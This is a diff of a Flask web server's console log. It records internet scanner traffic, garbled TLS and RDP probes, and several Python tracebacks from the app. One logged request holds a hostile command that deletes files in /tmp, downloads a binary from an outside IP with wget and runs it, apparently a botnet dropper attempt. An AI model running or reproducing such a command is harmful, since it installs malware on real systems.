@@ -1,6 +1,82 @@
+nohup: ignoring input
  * Serving Flask app 'website'
  * Debug mode: on
-64.62.156.17 - - [09/Jun/2024 11:46:04] code 400, message Bad request version ('À\x14À')
-143.110.151.68 - - [09/Jun/2024 12:32:05] code 400, message Bad request version ('À\x14À')
-143.110.151.68 - - [09/Jun/2024 12:32:05] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Öÿçö\x80E)\x8a£©2\x99Åqºè\x90Éê\x93\x14ÖBò§\x02\x17Io¥\x9c\x14\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
-143.110.151.68 - - [09/Jun/2024 12:32:07] code 400, message Bad request version ('À\x14À')
+36.75.61.161 - - [09/Jun/2024 18:24:31] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 94.156.71.59/jaws;sh+/tmp/jaws HTTP/1.1')
+91.238.181.71 - - [10/Jun/2024 01:33:23] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.79.181.104 - - [10/Jun/2024 01:50:54] code 400, message Bad request version ('À\x14À')
+179.43.167.219 - - [10/Jun/2024 03:47:45] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+185.224.3.4 - - [10/Jun/2024 04:02:20] code 400, message Bad request version ("ì\x7fÉ&öê\x7f\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+65.49.1.72 - - [10/Jun/2024 04:43:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ºB\x95\x045oÿ\x99kt\\õëaê`÷ÓÔ\x99L¨Of\x97\x8c±ídâFü\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+162.142.125.210 - - [10/Jun/2024 05:01:22] code 505, message Invalid HTTP version (2.0)
+162.142.125.210 - - [10/Jun/2024 05:01:27] code 505, message Invalid HTTP version (2.0)
+198.235.24.48 - - [10/Jun/2024 08:46:37] code 400, message Bad request version ('À\x13À')
+198.235.24.48 - - [10/Jun/2024 08:46:37] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Ô\x07FC-ã\x96´¿b>ËÈIÒÊ4àOéâ³\x92áû5îK\x98»fä\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+34.32.243.113 - - [10/Jun/2024 09:56:50] code 400, message Bad request version ('Qëõk;üb±Þä\x07\x94')
+68.183.226.156 - - [10/Jun/2024 13:21:39] code 400, message Bad request version ('À\x14À')
+68.183.226.156 - - [10/Jun/2024 13:21:41] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03á§ïcbry\x80À\x14\x7f\x13âø\x1b¹1\x97\x9añÇ¾¿¡*')
+68.183.226.156 - - [10/Jun/2024 13:21:48] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03G%ªí\x96L\x91ÀeÕä¸\x0f7Ê6-µ\x15¨E>úì3îÎ\x96£c^#\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+194.165.17.11 - - [10/Jun/2024 13:37:26] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+Invalid session Y6x0BfsISd8uL-1tAAB5 (further occurrences of this error will be logged with level INFO)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/views.py", line 944, in nawarvids
+    with open(f"website/playlists/nawar{course_name}.txt", 'r', encoding='utf-8') as file:
+FileNotFoundError: [Errno 2] No such file or directory: 'website/playlists/nawarWorkshop.txt'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/socketio/server.py", line 430, in handle_request
+    return self.eio.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+165.154.173.74 - - [10/Jun/2024 15:44:11] code 400, message Bad request version ('À\x13À')
+165.154.173.74 - - [10/Jun/2024 15:44:11] code 400, message Bad HTTP/0.9 request type ('t3')
+194.165.17.11 - - [10/Jun/2024 17:42:23] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+78.153.140.179 - - [10/Jun/2024 18:38:54] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Þ\x01\x00\x00Ú\x03\x03%!°¡©\x88Ï.ã\x96\x8aõ=âÞ¶\x95½I]v\\1&ÊãÔ)\x93põº\x00\x00nÀ0À,À2À.À/À+À1À-\x00¥\x00£\x00¡\x00\x9f\x00¤\x00¢\x00')
+192.241.193.21 - - [10/Jun/2024 20:50:48] code 400, message Bad request syntax ('MGLNDD_159.8.88.92_80')
+80.82.70.133 - - [10/Jun/2024 22:29:27] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+78.153.140.177 - - [11/Jun/2024 01:46:59] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01H\x01\x00\x01D\x03\x03Ç,½KmXýwï\x83ÓÿæX=çA¡í\x80\x8fá®\x16Oªöë¨#\x11\x9f')
+179.43.167.219 - - [11/Jun/2024 05:38:28] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.227.254.8 - - [11/Jun/2024 07:09:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+64.62.197.32 - - [11/Jun/2024 08:02:20] code 400, message Bad request version ('À\x14À')
+198.235.24.67 - - [11/Jun/2024 08:47:12] code 400, message Bad request version ('À\x13À')
+198.235.24.67 - - [11/Jun/2024 08:47:12] code 400, message Bad request version ('À(À$À\x14À')
+167.172.212.107 - - [11/Jun/2024 08:59:06] code 400, message Bad request version ('À\x14À')
+167.172.212.107 - - [11/Jun/2024 08:59:06] code 400, message Bad request version ('À\x14À')
+167.172.212.107 - - [11/Jun/2024 08:59:08] code 400, message Bad request version ('À\x14À')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/socketio/server.py", line 430, in handle_request
+    return self.eio.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
